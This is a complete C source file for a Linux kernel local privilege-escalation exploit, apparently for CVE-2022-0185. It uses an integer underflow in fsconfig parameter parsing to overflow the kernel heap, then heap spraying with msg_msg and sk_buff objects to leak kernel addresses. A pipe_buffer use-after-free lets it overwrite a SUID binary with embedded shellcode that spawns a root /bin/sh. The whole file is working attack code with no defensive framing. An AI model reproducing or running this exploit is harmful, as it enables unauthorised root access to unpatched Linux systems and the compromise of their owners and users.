#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif

#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

#ifndef MIN
#define MIN(a, b) (((a) < (b)) ? (a) : (b))
#endif

#define QTY_MSGQ (0x400)
#define QTY_SOCKETS (4)
#define QTY_PIPES (0x100)
#define MSG_TAG (0x13371337)

#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) \
  syscall(__NR_fsconfig, fd, cmd, key, value, aux)

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define MSG_MSG_SIZE(x) (x - 0x30)
#define MSG_MSGSEG_SIZE(x) (x - 0x8)

#define __RED_COLOR "\033[1;31m"
#define __BLUE_COLOR "\033[1;34m"
#define __GREEN_COLOR "\033[1;32m"
#define __RESET_COLOR "\033[0m"
#define log_info(fmt, ...) \
  printf(                  \
      "["__BLUE_COLOR      \
      "*"__RESET_COLOR     \
      "] " fmt "\n",       \
      ##__VA_ARGS__)
#define log_success(fmt, ...) \
  printf(                     \
      "["__GREEN_COLOR        \
      "+"__RESET_COLOR        \
      "] " fmt "\n",          \
      ##__VA_ARGS__)
#define log_error(fmt, ...) \
  fprintf(stderr,           \
          "["__RED_COLOR    \
          "-"__RESET_COLOR  \
          "] " fmt "\n",    \
          ##__VA_ARGS__)

#define fatal(fmt, ...)                                            \
  do {                                                             \
    log_error("Fatal error: %s:%d: " fmt "\n", __FILE__, __LINE__, \
              ##__VA_ARGS__);                                      \
    exit(1);                                                       \
  } while (0)

#define MTYPE_A ('A')
#define MTYPE_B ('B')

typedef struct {
  long mtype;
  char mtext[1];
} msg_msg;

typedef struct {
  void *ll_next;
  void *ll_prev;
  long m_type;
  size_t m_ts;
  void *next;
  void *security;
  char mtext[0];
} kmsg_msg;

int socket_fd;
int sockets_pairs[QTY_SOCKETS][2];
int pipes[QTY_PIPES][2];
int msgq_list1[QTY_MSGQ];
int msgq1_corrupted_id = -1;
int msgq_list2[QTY_MSGQ];
int msgq2_corrupted_id = -1;
int msgq2_leak_mtype = -1;
int msgq2_uaf_mtype = -1;
uint64_t msgq2_uaf_msg_addr = 0;
uint64_t heap_leak = 0;

// shellcode from:
// https://github.com/veritas501/CVE-2022-0185-PipeVersion/blob/46879488496014d337f2eb130edbc7ec6d467784/exploit.c#L115
static char shellcode_bin_sh[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x56, 0x56, 0x56,
    0x56, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x02, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf6, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xd2,
    0x31, 0xf6, 0x6a, 0x75, 0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6,
    0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};
static size_t shellcode_len =
    sizeof(shellcode_bin_sh) / sizeof(shellcode_bin_sh[0]);

void debug() {
  log_info("Paused (press enter to continue)");
  getchar();
}

void init_unshare(uid_t uid, gid_t gid) {
  int fd;
  char buf[0x100];

  // strace from `unshare -Ur xxx`
  unshare(CLONE_NEWNS | CLONE_NEWUSER);

  fd = open("/proc/self/setgroups", O_WRONLY);
  snprintf(buf, sizeof(buf), "deny");
  write(fd, buf, strlen(buf));
  close(fd);

  fd = open("/proc/self/uid_map", O_WRONLY);
  snprintf(buf, sizeof(buf), "0 %d 1", uid);
  write(fd, buf, strlen(buf));
  close(fd);

  fd = open("/proc/self/gid_map", O_WRONLY);
  snprintf(buf, sizeof(buf), "0 %d 1", gid);
  write(fd, buf, strlen(buf));
  close(fd);
}

void bind_cpu() {
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(0, &my_set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
    fatal("sched_setaffinity()");
  }
}

void init_socket() {
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (socket_fd < 0) {
    fatal("Socket error");
  }
  for (size_t i = 0; i < QTY_SOCKETS; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets_pairs[i]) < 0) {
      fatal("Socketpair error");
    }
  }
}

void environment_setup() {
  // enable CAP_SYS_ADMIN in owned namespace
  init_unshare(getuid(), getgid());
  // use sockets for alloc sk_buff
  init_socket();
  // bind exploit to only one cpu unit
  bind_cpu();
}

void hexdump(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    dprintf(2, "%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      dprintf(2, " ");
      if ((i + 1) % 16 == 0) {
        dprintf(2, "|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          dprintf(2, " ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          dprintf(2, "   ");
        }
        dprintf(2, "|  %s \n", ascii);
      }
    }
  }
}

int make_queue(key_t key, int msg_flags) {
  int result = msgget(key, msg_flags);
  if (result == -1) {
    fatal("msgget failure");
  }
  return result;
}

void send_msg(int msqid, void *message, size_t msgsz, int msg_flags) {
  if (msgsnd(msqid, message, msgsz, msg_flags) == -1) {
    fatal("msgsnd failure");
  }
}

ssize_t get_msg(int msqid, void *message, size_t msgsz, long msg_type,
                int msg_flags) {
  ssize_t received_sz = msgrcv(msqid, message, msgsz, msg_type, msg_flags);
  if (received_sz < 0) {
    fatal("msgrcv failure");
  }

  return received_sz;
}

void alloc_msg_queues(int qty, int *list) {
  for (size_t i = 0; i < qty; i++) {
    list[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
  }
}

int fs_open() {
  int fd = fsopen("ext4", 0);
  if (fd < 0) {
    fatal("fsopen()");
  }
  return fd;
}

void clean_msgq1() {
  char buf[0x2000];
  log_info("Cleaning msgq1...");
  uint64_t msg_size = MSG_MSG_SIZE(0x1000) + MSG_MSGSEG_SIZE(0x400);
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    msgrcv(msgq_list1[i], buf, msg_size, MTYPE_A, IPC_NOWAIT);
  }
}

void clean_msgq2() {
  char buf[0x2000];
  log_info("Cleaning msgq2...");
  uint64_t msg_size = MSG_MSG_SIZE(0x400);
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    for (size_t j = 0; j < 16; j++) {
      msgrcv(msgq_list2[i], buf, msg_size, MTYPE_B | (j << 8), IPC_NOWAIT);
    }
  }
}

void clean_pipes() {
  char buf[0x100];
  for (size_t i = 0; i < QTY_PIPES; i++) {
    read(pipes[i][0], buf, 0x100);
    close(pipes[i][0]);
    close(pipes[i][1]);
  }
}

void spray_skbuff(int qty_skbufs, char *buf, size_t len) {
  for (size_t i = 0; i < QTY_SOCKETS; i++) {
    for (size_t j = 0; j < qty_skbufs; j++) {
      if (write(sockets_pairs[i][0], buf, len) < 0) {
        fatal("Spraying sk_buff failed. socketpair=%zu loop=%zu", i, j);
      }
    }
  }
}

void free_skbuff(int qty_skbufs, char *buf, size_t len) {
  for (size_t i = 0; i < QTY_SOCKETS; i++) {
    for (size_t j = 0; j < qty_skbufs; j++) {
      if (read(sockets_pairs[i][1], buf, len) < 0) {
        fatal("Free sk_buff failed. socketpair=%zu loop=%zu", i, j);
      }
    }
  }
}

void first_step(int fd) {
  char buf[0x2000] = {0}, buf_b[0x2000] = {0};
  msg_msg *message = (msg_msg *)buf;
  msg_msg *message_b = (msg_msg *)buf_b;
  uint64_t msg_size = MSG_MSG_SIZE(0x1000) + MSG_MSGSEG_SIZE(0x400);
  uint64_t corrupted_msg_size =
      MSG_MSG_SIZE(0x1000) + MSG_MSGSEG_SIZE(0x400 + 0x400);
  uint64_t second_msg_size = MSG_MSG_SIZE(0x400);
  log_info("Starting fsconfig heap overflow...");

  /**
   * For int underflow, we need "ctx->data_size" be 4096
   * so we need to add new key/value configs, for loop iteration add 0x100 for
   * data_size.
   * Note: -2 are because, in "legacy_parse_param", data_size is
   * summed twice, one for add "," and other for "=" 0x100 * 15 == 3840
   */
  memset(buf, 'A', 0x100 - 2);
  for (size_t i = 0; i < 15; i++) {
    fsconfig(fd, FSCONFIG_SET_STRING, "\0", buf, 0);
  }

  /**
   * 3840 + 0xff == 4096 == 0xfff
   * in `if (len > PAGE_SIZE - 2 - size)`, the math will be:
   * uin32(0x1000 - 2 - 0xfff) == 0xffffffff
   */
  memset(buf, 0, sizeof(buf));
  memset(buf, 'B', 0x100 - 3);
  fsconfig(fd, FSCONFIG_SET_STRING, "\0", buf, 0);

  log_info("Spraying msg_msg");

  // Alloc msg_msg in 4k slab and msg_msgseg in 0x400 slab
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    message->mtype = MTYPE_A;
    memset(message->mtext, 'J', msg_size);
    ((int *)message->mtext)[0] = MSG_TAG;
    ((int *)message->mtext)[1] = i;

    send_msg(msgq_list1[i], message, msg_size, 0);
  }

  log_info("Try overwrite msg_msg.m_ts");

  /**
   * 0x4241414141414141 0x4342424242424242
   * 0xc843434343434343 0x0000000000000017
   */
  memset(buf, 0, sizeof(buf));
  strcat(buf, "AAAAAAA");                             // m_list.next
  strcat(buf, "BBBBBBBB");                            // m_list.prev
  strcat(buf, "CCCCCCCC");                            // m_type
  memcpy(buf + strlen(buf), &corrupted_msg_size, 2);  // m_ts

  fsconfig(fd, FSCONFIG_SET_STRING, "\0", buf, 0);

  log_info("Searching corrupted msg_msg");
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    ssize_t msg_sz = msgrcv(msgq_list1[i], message, corrupted_msg_size, 0,
                            MSG_COPY | IPC_NOWAIT);
    if (msg_sz < 0) {
      continue;
    }
    if (msg_sz == corrupted_msg_size) {
      log_success("Found corrupted msg_msg, id: %d", msgq_list1[i]);
      msgq1_corrupted_id = msgq_list1[i];
      msgq_list1[i] = make_queue(IPC_PRIVATE, IPC_CREAT | 0666);
      uint64_t *oob_data = (uint64_t *)(message->mtext + msg_size);
      if (memcmp(&oob_data[1], "JJJJJJJJ", 8)) {
        log_error("Corrupted msg_msg it not allocated by msg_msgseg");
      }
      break;
    }
  }

  clean_msgq1();
  if (msgq1_corrupted_id == -1) {
    fatal("Failed finding msg_msg corrupted :(");
  }

  log_info("Alloc msg_msg to get 0x400 slab freed");
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    memset(message->mtext, 'D', second_msg_size);
    ((int *)message->mtext)[0] = MSG_TAG;
    ((int *)message->mtext)[1] = i;
    // alloc 16 messages for each queue
    for (size_t j = 0; j < 16; j++) {
      message->mtype = MTYPE_B | (j << 8);  // mark each message with some tag
      send_msg(msgq_list2[i], message, second_msg_size, 0);
    }
  }

  ssize_t msg_sz = get_msg(msgq1_corrupted_id, message, corrupted_msg_size, 0,
                           MSG_COPY | IPC_NOWAIT);
  if (msg_sz != corrupted_msg_size) {
    fatal("Error reading from corrupted message");
  }
  uint64_t *oob_data = (uint64_t *)(message->mtext + msg_size);
  /**
   * kmsg is a new msg_msg allocated in 0x400 slab with we
   * have arb read/write
   */
  kmsg_msg *kmsg = (kmsg_msg *)oob_data;

  if (((int *)&kmsg->mtext)[0] != MSG_TAG) {
    clean_msgq2();
    fatal("Dont acquire 0x400 msg_msg");
  }
  log_success("Acquire 0x400 msg_msg with success");

  int leak_id = ((int *)&kmsg->mtext)[1];
  msgq2_corrupted_id = msgq_list2[leak_id];
  msgq2_leak_mtype = kmsg->m_type;
  msgq2_uaf_msg_addr = (uint64_t)kmsg->ll_prev;  // addr from last message
  msgq2_uaf_mtype = kmsg->m_type - 0x100;        // mtype from last message

  msgq_list2[leak_id] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

  log_info("leak msgq2_corrupted_id: %d", msgq2_corrupted_id);
  log_info("leak msgq2_leak_mtype: 0x%x", msgq2_leak_mtype);
  log_info("leak msgq2_uaf_msg_addr: %p", (void *)msgq2_uaf_msg_addr);
  log_info("leak msgq2_uaf_mtype: 0x%x", msgq2_uaf_mtype);

  int msgq2_msg_id_queue = msgq2_leak_mtype >> 8;

  // free adjacent messages from the corrupted message
  for (size_t i = msgq2_msg_id_queue + 1; i < 16; i++) {
    msgrcv(msgq2_corrupted_id, buf, second_msg_size, MTYPE_B | (i << 8),
           IPC_NOWAIT);
  }

  memset(buf, 0, sizeof(buf));
  kmsg_msg *p = (kmsg_msg *)buf;
  p->ll_next = (void *)msgq2_uaf_msg_addr;
  p->ll_prev = (void *)0x1337133713371337;
  p->m_type = MTYPE_A;

  uint64_t *p2 = (uint64_t *)(buf + 0x80);
  *p2++ = 0;  // 0x80
  *p2++ = 0;  // 0x88
  memcpy(message_b->mtext, buf, second_msg_size);
  message_b->mtype = MTYPE_B;

  send_msg(msgq2_corrupted_id, message_b, second_msg_size, 0);

  log_info("Use oob read on first corrupted message");

  msg_sz = get_msg(msgq1_corrupted_id, message, corrupted_msg_size, 0,
                   MSG_COPY | IPC_NOWAIT);
  if (msg_sz != corrupted_msg_size) {
    fatal("Error reading from corrupted message");
  }
  oob_data = (uint64_t *)(message->mtext + msg_size);
  kmsg = (kmsg_msg *)oob_data;
  if (((int *)&kmsg->mtext)[0] != MSG_TAG) {
    clean_msgq2();
    fatal("Something went wrong");
  }
  // Heap leak are a pointer to message_b, the next message
  // in linked list after 0x400 corrupted message
  heap_leak = (uint64_t)(kmsg->ll_next + sizeof(kmsg_msg));
  log_success("Kernel heap leak: %p", (void *)heap_leak);
  // debug();
  if (memchr(&heap_leak, 0, 8) != NULL) {
    clean_msgq2();
    fatal("Kernel heap leak error: %p", (void *)heap_leak);
  }

  clean_msgq2();
}

void second_step(int fd, char *target_path) {
  char buf[0x2000] = {0}, buf_b[0x2000] = {0};
  msg_msg *message = (msg_msg *)buf;
  uint64_t msg_size = MSG_MSG_SIZE(0x1000) + MSG_MSGSEG_SIZE(0x400);
  uint64_t second_msg_size = MSG_MSG_SIZE(0x400);
  int qty_skbufs = 0x80;
  int pipe_uaf_idx = -1;
  log_info("Starting fsconfig heap overflow...");

  /**
   * For int underflow, we need "ctx->data_size" be 4096
   * so we need to add new key/value configs, for loop iteration add 0x100 for
   * data_size.
   * Note: -2 are because, in "legacy_parse_param", data_size is
   * summed twice, one for add "," and other for "=" 0x100 * 15 == 3840
   */
  memset(buf, 'A', 0x100 - 2);
  for (size_t i = 0; i < 15; i++) {
    fsconfig(fd, FSCONFIG_SET_STRING, "\0", buf, 0);
  }

  /**
   * 3840 + 0xff == 4096 == 0xfff
   * in `if (len > PAGE_SIZE - 2 - size)`, the math will be:
   * uin32(0x1000 - 2 - 0xfff) == 0xffffffff
   */
  memset(buf, 0, sizeof(buf));
  memset(buf, 'B', 0x100 - 3);
  fsconfig(fd, FSCONFIG_SET_STRING, "\0", buf, 0);

  log_info("Spraying msg_msg");

  // Alloc msg_msg in 4k slab and msg_msgseg in 0x400 slab
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    message->mtype = MTYPE_A;
    memset(message->mtext, 'J', msg_size);
    ((int *)message->mtext)[0] = MSG_TAG;
    ((int *)message->mtext)[1] = i;

    send_msg(msgq_list1[i], message, msg_size, 0);
  }

  log_info("Try overwrite msg_msg.next");

  memset(buf, 0, sizeof(buf));
  kmsg_msg *p = (kmsg_msg *)buf;
  p->ll_next = (void *)heap_leak;
  p->ll_prev = (void *)0xdeadbeefbeefdead;
  p->m_type = MTYPE_A;

  fsconfig(fd, FSCONFIG_SET_STRING, buf, "\0", 0);

  get_msg(msgq2_corrupted_id, buf, second_msg_size, msgq2_uaf_mtype, 0);

  memset(buf, 0, sizeof(buf));
  p->ll_next = (void *)heap_leak + 0x80;
  p->ll_prev = (void *)heap_leak + 0x80;
  p->m_ts = 0x100;
  p->m_type = MTYPE_B + 1;
  p->next = 0;
  p->security = 0;

  /**
   * Use sk_buff struct, specifically sk_buff->data, for construct a msg_msg
   * fake header and free using msgrcv, forcing a UAF
   */
  // sizeof(struct skb_shared_info) == 0x140
  spray_skbuff(qty_skbufs, buf, 0x400 - 0x140);

  for (size_t i = 0; i < QTY_MSGQ; i++) {
    if (msgrcv(msgq_list1[i], buf, second_msg_size, MTYPE_B + 1, IPC_NOWAIT) >
        0) {
      log_success("Freed skbuff with msgid=%zu", i);
      break;
    }
  }

  log_info("Allocating pipe_buffer in same slab");
  int target_fd = open(target_path, O_RDONLY);
  if (target_fd < 0) {
    fatal("Couldn't open file: %s", target_path);
  }

  for (size_t i = 0; i < QTY_PIPES; i++) {
    if (pipe(pipes[i]) != 0) {
      fatal("Failed create pipes");
    }

    int pipe_size = fcntl(pipes[i][0], F_GETPIPE_SZ);
    for (size_t n = pipe_size; n > 0;) {
      int write_len = MIN(sizeof(buf_b), n);
      write(pipes[i][1], buf_b, write_len);
      n -= write_len;
    }

    for (size_t n = pipe_size; n > 0;) {
      int read_len = MIN(sizeof(buf_b), n);
      read(pipes[i][0], buf_b, read_len);
      n -= read_len;
    }

    write(pipes[i][1], buf, 0x100 + i);
    loff_t off = 1;
    if (splice(target_fd, &off, pipes[i][1], NULL, 1, 0) < 0) {
      fatal("Failed in splice");
    }
  }

  log_info("Freeing sk_buf sprayed, forcing pipe_buffer UAF");
  char pipe_bkp[0x280];
  for (size_t i = 0; i < QTY_SOCKETS; i++) {
    for (size_t j = 0; j < qty_skbufs; j++) {
      if (read(sockets_pairs[i][1], buf, 0x400 - 0x140) < 0) {
        fatal("Free sk_buff failed");
      }

      int pipe_metadata = ((uint32_t *)buf)[3];
      if (pipe_metadata >= 0x100 && pipe_metadata < 0x100 + QTY_PIPES) {
        pipe_uaf_idx = pipe_metadata - 0x100;
        log_success("UAF pipe idx: %d", pipe_uaf_idx);
        memcpy(pipe_bkp, buf, 0x280);
      }
    }
  }

  log_info("Try edit pipe_buffer->flags");
  memset(buf, 0, sizeof(buf));
  memcpy(buf, pipe_bkp, 0x280);
  uint64_t *buf_as_uint64 = (uint64_t *)buf;
  buf_as_uint64[6] = 0;
  buf_as_uint64[8] = PIPE_BUF_FLAG_CAN_MERGE;
  spray_skbuff(qty_skbufs, buf, 0x400 - 0x140);

  ssize_t nwrite =
      write(pipes[pipe_uaf_idx][1], shellcode_bin_sh, shellcode_len);
  if (nwrite < 0) {
    fatal("Failed to write in %s", target_path);
  }
  if (nwrite < shellcode_len) {
    log_error("Partial write, exiting for safe, try rerun exploit");
  }

  log_info("Testing %s", target_path);
  target_fd = open(target_path, O_RDONLY);
  if (target_fd < 0) {
    fatal("Couldn't open file: %s", target_path);
  }

  char test_content[0x10];
  read(target_fd, test_content, 0x10);
  uint32_t *ptr = (uint32_t *)(test_content + 9);
  if (ptr[0] != 0x56565656) {
    fatal("Overwrite not work :(");
  }

  log_info("Cleaning up structs");
  close(pipes[pipe_uaf_idx][0]);
  close(pipes[pipe_uaf_idx][1]);
  for (size_t i = 0; i < QTY_MSGQ; i++) {
    memset(buf, 0, sizeof(buf));
    message->mtype = MTYPE_B;
    send_msg(msgq_list2[i], message, second_msg_size, 0);
  }
}

int main(int argc, char *argv[]) {
  int fs_fd;
  char *suid_target = "/suid";

  if(argc == 2) {
    suid_target = argv[1];
  }

  environment_setup();

  alloc_msg_queues(QTY_MSGQ, msgq_list1);
  alloc_msg_queues(QTY_MSGQ, msgq_list2);

  fs_fd = fs_open();
  first_step(fs_fd);
  close(fs_fd);
  log_success("First step succeeded!");

  fs_fd = fs_open();
  second_step(fs_fd, suid_target);
  close(fs_fd);

  log_success("Success!!!");
  execl(suid_target, suid_target, NULL);

  return 0;
}
